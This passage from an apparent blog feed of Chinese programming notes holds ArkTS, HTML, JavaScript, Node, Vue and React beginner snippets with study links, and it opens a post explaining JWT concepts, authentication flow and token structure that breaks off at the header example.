class_">ItemCar</span>(item)</span><br><span class="line"></span><br><span class="line"><span class="comment">//局部构建函数，不用写function</span></span><br><span class="line"><span class="meta">@Builder</span> <span class="title class_">ItemCard</span>(<span class="attr">item</span>: <span class="title class_">Item</span>)&#123;</span><br><span class="line"><span class="title class_">Row</span>(&#123;<span class="attr">space</span>: <span class="number">10</span>&#125;)&#123;</span><br><span class="line"><span class="comment">//组件内容</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title class_">ItemCar</span>(item)</span><br></pre></td></tr></table></figure></li><li>自定义公共样式<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局公共样式函数</span></span><br><span class="line"><span class="meta">@Styles</span> <span class="keyword">function</span> <span class="title function_">fillScreen</span>(<span class="params"></span>)&#123;</span><br><span class="line">.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line"><span class="comment">//通用的样式</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line">.<span class="title function_">fillScreen</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//局部公共样式只需要去掉function即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果不是公共的属性，则使用继承模式，只能写在全局</span></span><br><span class="line"><span class="meta">@Extend</span>(<span class="title class_">Text</span>) <span class="keyword">function</span> <span class="title function_">priceText</span>(<span class="params"></span>)&#123; <span class="comment">//Extend继承Text的属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> harmonyos </tag>
            
            <tag> ArkUI </tag>
            
            <tag> ArkTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端开发学习笔记</title>
      <link href="/2024/01/11/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/01/11/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前端开发基础"><a href="#前端开发基础" class="headerlink" title="前端开发基础"></a>前端开发基础</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>前端开发基础<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.world</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Web开发基础<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;world&quot;</span>&gt;</span>Hello world<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>笔记：</strong></p><ul><li><a href="https://m78alien.github.io/2024/01/18/HTML%E7%94%A8%E6%B3%95/">HTML用法</a></li><li><a href="https://m78alien.github.io/2024/01/19/CSS%E7%94%A8%E6%B3%95/">CSS用法</a></li><li><a href="https://m78alien.github.io/2024/01/23/CSS%E7%94%A8%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/">CSS用法（二）-动画转换</a></li><li><a href="https://m78alien.github.io/2024/01/25/Web%E7%A7%BB%E5%8A%A8%E9%80%82%E9%85%8D/">Web移动适配</a></li></ul><p><strong>参考：</strong></p><ul><li><a href="https://www.runoob.com/html/html-tutorial.html">HTML5 教程 | 菜鸟教程</a></li><li><a href="https://www.runoob.com/css3/css3-tutorial.html">CSS3 教程 | 菜鸟教程</a></li><li><a href="https://www.bilibili.com/video/BV1kM4y127Li?p=1&vd_source=7b17ffa3959870f2c33c15d5128f451f">前端开发基础教程 | 黑马程序员</a></li></ul><hr><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sayHi = <span class="string">&quot;Hello JavaScript&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;h1&gt;这是一个标题&lt;/h1&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">say</span>(<span class="params"></span>) &#123;  <span class="comment">//定义函数</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sayHi)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">say</span>()</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(sayHi);</span><br></pre></td></tr></table></figure><p><strong>笔记：</strong></p><ul><li><a href="https://m78alien.github.io/2024/01/28/JavaScript-%E4%BB%8B%E7%BB%8D%E3%80%81%E5%8F%98%E9%87%8F%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/">JavaScript-介绍、变量、数据类型</a></li><li><a href="https://m78alien.github.io/2024/01/28/JavaScript-%E8%BF%90%E7%AE%97%E7%AC%A6%E3%80%81%E5%88%86%E6%94%AF%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E3%80%81%E6%95%B0%E7%BB%84/">JavaScript-运算符、分支循环语句、数组</a></li><li><a href="https://m78alien.github.io/2024/01/28/JavaScript-%E5%87%BD%E6%95%B0%E3%80%81%E5%AF%B9%E8%B1%A1/">JavaScript-函数、对象</a></li><li><a href="https://m78alien.github.io/2024/01/29/JavaScript-DOM%E8%8E%B7%E5%8F%96%E3%80%81%E5%B1%9E%E6%80%A7%E6%93%8D%E4%BD%9C/">JavaScript-DOM获取、属性操作</a></li><li><a href="https://m78alien.github.io/2024/01/31/JavaScript-DOM%E4%BA%8B%E4%BB%B6/">JavaScript-DOM事件</a></li><li><a href="https://m78alien.github.io/2024/02/02/JavaScript-DOM%E8%8A%82%E7%82%B9%E3%80%81%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%BA%8B%E4%BB%B6/">JavaScript-DOM节点、移动端事件</a></li><li><a href="https://m78alien.github.io/2024/02/02/JavaScript-BOM%E6%93%8D%E4%BD%9C/">JavaScript-BOM操作</a></li><li><a href="https://m78alien.github.io/2024/02/03/JavaScript-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">JavaScript-正则表达式</a></li><li><a href="https://m78alien.github.io/2024/03/05/JavaScript-%E6%A1%88%E4%BE%8B%E5%BA%94%E7%94%A8-%E5%95%86%E5%93%81%E6%94%BE%E5%A4%A7%E9%95%9C/">JavaScript-案例应用-商品放大镜</a></li><li><a href="https://m78alien.github.io/2024/03/07/JavaScript-%E4%BD%9C%E7%94%A8%E5%9F%9F%E3%80%81%E8%A7%A3%E6%9E%84%E3%80%81%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/">JavaScript-作用域、解构、箭头函数</a></li><li><a href="https://m78alien.github.io/2024/03/07/JavaScript-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E3%80%81%E6%95%B0%E6%8D%AE%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">JavaScript-构造函数、数据常用函数</a></li><li><a href="https://m78alien.github.io/2024/03/11/JavaScript-%E6%B7%B1%E5%85%A5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/">JavaScript-深入面向对象</a></li><li><a href="https://m78alien.github.io/2024/03/12/JavaScript-%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%E3%80%81%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E3%80%81this%E3%80%81%E9%98%B2%E6%8A%96%E8%8A%82%E6%B5%81/">JavaScript-深浅拷贝、异常处理、this、防抖节流</a></li></ul><p><strong>参考：</strong></p><ul><li><a href="https://www.runoob.com/js/js-tutorial.html">JavaScript 教程 | 菜鸟教程</a></li><li><a href="https://www.bilibili.com/video/BV1Y84y1L7Nn?p=1&vd_source=7b17ffa3959870f2c33c15d5128f451f">JavaScript 教程 | 黑马程序员</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">JavaScript | 开发社区文档</a></li></ul><hr><h1 id="框架前置知识"><a href="#框架前置知识" class="headerlink" title="框架前置知识"></a>框架前置知识</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>()</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;欢迎使用 Node.js 和 http 模块创建的 Web 服务&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web服务启动成功&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>笔记：</strong> </p><ul><li><a href="https://m78alien.github.io/2024/03/13/AJAX-%E5%85%A5%E9%97%A8/">AJAX-入门</a></li><li><a href="https://m78alien.github.io/2024/03/13/AJAX-%E5%8E%9F%E7%90%86/">AJAX-原理</a></li><li><a href="https://m78alien.github.io/2024/03/14/AJAX-%E8%BF%9B%E9%98%B6/">AJAX-进阶</a></li><li><a href="https://m78alien.github.io/2024/03/14/Node.js-%E5%85%A5%E9%97%A8/">Node.js-入门</a></li><li><a href="https://m78alien.github.io/2024/03/20/Node.js-%E6%A8%A1%E5%9D%97%E5%8C%96/">Node.js-模块化</a></li><li><a href="https://m78alien.github.io/2024/03/21/Webpack/">Webpack</a></li><li><a href="https://m78alien.github.io/2024/03/21/Git%20%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F/">Git 版本控制系统</a></li></ul><p><strong>参考：</strong> </p><ul><li><a href="https://www.bilibili.com/video/BV1MN411y7pw?p=1&vd_source=7b17ffa3959870f2c33c15d5128f451f">AJAX 教程 | 黑马程序员</a></li><li><a href="https://www.runoob.com/ajax/ajax-tutorial.html">AJAX 教程 | 菜鸟教程</a></li><li><a href="https://www.runoob.com/nodejs/nodejs-tutorial.html">Node.js | 菜鸟教程</a></li><li><a href="https://webpack.docschina.org/concepts/">Webpack | 官方中文文档</a></li><li><a href="https://www.runoob.com/git/git-tutorial.html">Git学习 | 菜鸟教程</a></li></ul><hr><h1 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; msg &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">msg</span>: <span class="string">&#x27;Hello Vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>笔记：</strong> </p><ul><li><a href="https://m78alien.github.io/2024/03/22/Vue-%E6%A6%82%E5%BF%B5%E3%80%81%E5%85%A5%E9%97%A8/">Vue-概念、入门</a></li><li><a href="https://m78alien.github.io/2024/03/23/Vue-%E6%8C%87%E4%BB%A4/">Vue-指令</a></li><li><a href="https://m78alien.github.io/2024/03/23/Vue-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E3%80%81%E4%BE%A6%E5%90%AC%E5%99%A8%E3%80%81%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E3%80%81%E5%B7%A5%E7%A8%8B%E5%8C%96/">Vue-计算属性、侦听器、生命周期、工程化</a></li><li><a href="https://m78alien.github.io/2024/03/24/Vue-%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E3%80%81%E8%BF%9B%E9%98%B6%E7%94%A8%E6%B3%95/">Vue-组件通信、进阶用法</a></li><li><a href="https://m78alien.github.io/2024/03/24/Vue-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4%E3%80%81%E6%8F%92%E6%A7%BD/">Vue-自定义指令、插槽</a></li><li><a href="https://m78alien.github.io/2024/03/25/Vue-%E8%B7%AF%E7%94%B1/">Vue-路由</a></li><li><a href="https://m78alien.github.io/2024/03/26/Vue-Vuex%20%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">Vue-Vuex 基本用法</a></li><li><a href="https://m78alien.github.io/2024/03/31/Vue3-%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">Vue3-基本用法</a></li><li><a href="https://m78alien.github.io/2024/04/01/Vue3-Pinia%E5%B7%A5%E5%85%B7/">Vue3-Pinia工具</a></li><li><a href="https://m78alien.github.io/2024/04/08/Vue3-%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/">Vue3-项目配置</a></li></ul><p><strong>参考：</strong> </p><ul><li><a href="https://cn.vuejs.org/">Vue | 官网</a></li><li><a href="https://www.runoob.com/vue2/vue-tutorial.html">Vue2 | 菜鸟教程</a></li><li><a href="https://www.runoob.com/vue3/vue3-tutorial.html">Vue3 | 菜鸟教程</a></li><li><a href="https://www.bilibili.com/video/BV1HV4y1a7n4?p=1&vd_source=7b17ffa3959870f2c33c15d5128f451f">Vue2&amp;Vue3 | 黑马程序员</a></li></ul><hr><h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> message = <span class="string">&#x27;this is message&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            Hello React!</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;message&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p><strong>笔记：</strong> </p><ul><li><a href="https://m78alien.github.io/2024/05/15/React-%E5%9F%BA%E7%A1%80/">React-基础</a></li><li><a href="https://m78alien.github.io/2024/05/21/React-Redux%E9%9B%86%E4%B8%AD%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/">React-Redux集中状态管理工具</a></li><li><a href="https://m78alien.github.io/2024/05/21/React-%E8%B7%AF%E7%94%B1/">React-路由</a></li></ul><p><strong>参考：</strong> </p><ul><li><a href="https://react.docschina.org/">React | 官方中文文档</a></li><li><a href="https://www.runoob.com/react/react-tutorial.html">React | 菜鸟教程</a></li><li><a href="https://www.bilibili.com/video/BV1ZB4y1Z7o8/">React | 黑马程序员</a></li></ul><hr><h1 id="鸿蒙HarmonyOS应用开发"><a href="#鸿蒙HarmonyOS应用开发" class="headerlink" title="鸿蒙HarmonyOS应用开发"></a>鸿蒙HarmonyOS应用开发</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240326215427.png" alt="image.png"></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entry</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">struct <span class="title class_">Index</span> &#123;</span><br><span class="line">    <span class="meta">@State</span> <span class="attr">message</span>: <span class="built_in">string</span> = <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">            <span class="title class_">Column</span>() &#123;</span><br><span class="line">                <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">message</span>)</span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">50</span>)</span><br><span class="line">                .<span class="title function_">fontWeight</span>(<span class="title class_">FontWeight</span>.<span class="property">Bold</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>笔记：</strong></p><ul><li><a href="https://m78alien.github.io/2024/01/11/%E9%B8%BF%E8%92%99HarmonyOS%204-ArkUI%E7%BB%84%E4%BB%B6/">鸿蒙HarmonyOS 4-ArkUI组件</a></li><li><a href="https://m78alien.github.io/2024/01/11/%E9%B8%BF%E8%92%99HarmonyOS%204-ArkUI%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86/">鸿蒙HarmonyOS 4-ArkUI状态管理</a></li><li><a href="https://m78alien.github.io/2024/01/12/%E9%B8%BF%E8%92%99HarmonyOS%204-%E9%A1%B5%E9%9D%A2%E8%B7%AF%E7%94%B1/">鸿蒙HarmonyOS 4-页面路由</a></li><li><a href="https://m78alien.github.io/2024/01/12/%E9%B8%BF%E8%92%99HarmonyOS%204-%E5%8A%A8%E7%94%BB/">鸿蒙HarmonyOS 4-动画</a></li><li><a href="https://m78alien.github.io/2024/01/13/%E9%B8%BF%E8%92%99HarmonyOS%204-Stage%E6%A8%A1%E5%9E%8B/">鸿蒙HarmonyOS 4-Stage模型</a></li><li><a href="https://m78alien.github.io/2024/01/14/%E9%B8%BF%E8%92%99HarmonyOS%204-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/">鸿蒙HarmonyOS 4-网络连接</a></li><li><a href="https://m78alien.github.io/2024/01/15/%E9%B8%BF%E8%92%99HarmonyOS%204-%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96/">鸿蒙HarmonyOS 4-数据持久化</a></li><li><a href="https://m78alien.github.io/2024/01/16/%E9%B8%BF%E8%92%99HarmonyOS%204-%E9%80%9A%E7%9F%A5/">鸿蒙HarmonyOS 4-通知</a></li></ul><p><strong>参考：</strong></p><ul><li><a href="https://www.bilibili.com/video/BV1Sa4y1Z7B1?p=1">黑马程序员鸿蒙应用开发视频教程</a></li><li><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides-V3/start-overview-0000001478061421-V3?catalogVersion=V3">鸿蒙官方开发文档</a></li><li><a href="https://ohpm.openharmony.cn/#/cn/home">OpenHarmony三方库中心仓</a></li><li><a href="https://www.typescriptlang.org/zh/play#code/GYVwdgxgLglg9mABAZwIYE8AWBTANruACjFQFtsAuFKAJxjAHNEBKCgNzhgBMBvAKESDEEBMji5sAOgINCAchz44iOYgDUiEuXUqAhHOZ8AvnwlQUGTDEQBeRMTKVqdRi1sA+RPyHDR4qTLyVio6Wtg6cvqGJmhYeATyAB6kEAZ8sVbyAEIYpKiJBkA">TypeScript演练场</a></li></ul><hr><h1 id="面试知识点"><a href="#面试知识点" class="headerlink" title="面试知识点"></a>面试知识点</h1><p><strong>笔记：</strong> </p><ul><li><a href="https://m78alien.github.io/2024/04/07/JS%20%E5%8E%9F%E7%90%86%E9%9D%A2%E8%AF%95-this%E3%80%81%E7%BB%A7%E6%89%BF%E3%80%81fetch%E3%80%81generator/">JS 原理面试-this、继承、fetch、generator</a></li></ul><p><strong>参考：</strong></p><ul><li><a href="https://www.bilibili.com/video/BV1mH4y1Q7Z7/">JS 原理课 | 黑马程序员</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> css </tag>
            
            <tag> html </tag>
            
            <tag> harmonyos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT安全</title>
      <link href="/2023/10/30/JWT%E5%AE%89%E5%85%A8/"/>
      <url>/2023/10/30/JWT%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231027131632.png" alt="image.png"></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231027135053.png" alt="image.png"></p><h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="JWT定义"><a href="#JWT定义" class="headerlink" title="JWT定义"></a>JWT定义</h2><ul><li>JWT（Json Web Token）是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</li></ul><h2 id="JWT作用"><a href="#JWT作用" class="headerlink" title="JWT作用"></a>JWT作用</h2><ul><li><strong>授权</strong>：一旦用户登录，每个后续请求将包括JWT，从而允许用户访问该令牌允许的路由，服务和资源。它的开销很小并且可以在不同的域中使用。如：单点登录。</li><li><strong>信息交换</strong>：在各方之间安全地传输信息。JWT可进行签名（如使用公钥&#x2F;私钥对)，因此可确保发件人。由于签名是使用标头和有效负载计算的，因此还可验证内容是否被篡改。</li></ul><h1 id="JWT区别"><a href="#JWT区别" class="headerlink" title="JWT区别"></a>JWT区别</h1><h2 id="传统Session"><a href="#传统Session" class="headerlink" title="传统Session"></a>传统Session</h2><ul><li>http协议本身是一种无状态的协议，如果用户向服务器提供了用户名和密码来进行用户认证，下次请求时，用户还要再一次进行用户认证才行。因为根据http协议，服务器并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样应用就能识别请求来自哪个用户。</li><li>这种模式的问题在于，扩展性（scaling）不好。单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。</li><li>举例来说，A 网站和 B 网站是同一家公司的关联服务。现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，请问怎么实现？</li><li>一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。</li><li>另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表。</li></ul><h2 id="与Session的区别"><a href="#与Session的区别" class="headerlink" title="与Session的区别"></a>与Session的区别</h2><ul><li>两者的主要目的都是存储用户信息，但是session将用户信息存储再服务器端，而JWT则是在客户端。JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</li></ul><h1 id="JWT认证"><a href="#JWT认证" class="headerlink" title="JWT认证"></a>JWT认证</h1><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><ul><li>前端通过Web表单将自己的用户名和密码发送到后端的接口。该过程一般是HTTP的POST请求。建议的方式是通过SSL加密的传输(https协议)，从而避免敏感信息被嗅探。</li><li>后端核对用户名和密码成功后，将用户的id等其他信息作为JWT Payload(负载)，将其与头部分别进行Base64编码拼接后签名，形成一个JWT(Token)。</li><li>后端将JWT字符串作为登录成功的返回结果返回给前端。前端可以将返回的结果保存在localStorage（浏览器本地缓存）或sessionStorage（session缓存）上，退出登录时前端删除保存的JWT即可。</li><li>前端在每次请求时将JWT放入HTTP的Header中的Authorization位。(解决XSS和XSRF问题）HEADER</li><li>后端检查是否存在，如存在验证JWT的有效性。例如，检查签名是否正确﹔检查Token是否过期;检查Token的接收方是否是自己(可选）</li><li>验证通过后后端使用JWT中包含的用户信息进行其他逻辑操作，返回相应结果。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030141022.png" alt="image.png"></li></ul><h2 id="JWT优点"><a href="#JWT优点" class="headerlink" title="JWT优点"></a>JWT优点</h2><ul><li>简洁(Compact)：可以通过URL，POST参数或者在HTTP header发送，数据量小，传输速度也很快；</li><li>自包含(Self-contained)：负载中包含了所有用户所需要的信息，避免了多次查询数据库；</li><li>Token是以JSON加密的形式保存在客户端，所以JWT是跨语言的，原则上任何web形式都支持。</li><li>不需要在服务端保存会话信息，特别适用于分布式微服务。</li></ul><h1 id="JWT的结构"><a href="#JWT的结构" class="headerlink" title="JWT的结构"></a>JWT的结构</h1><blockquote><p>令牌组成：</p><ol><li>标头（Header）</li><li>有效载荷（Payload）</li><li>签名（Signature）<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030205052.png" alt="image.png"></li></ol></blockquote><h2 id="标头Header"><a href="#标头Header" class="headerlink" title="标头Header"></a>标头Header</h2><ul><li>Header是一个JSON对象，描述JWT的元数据<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span 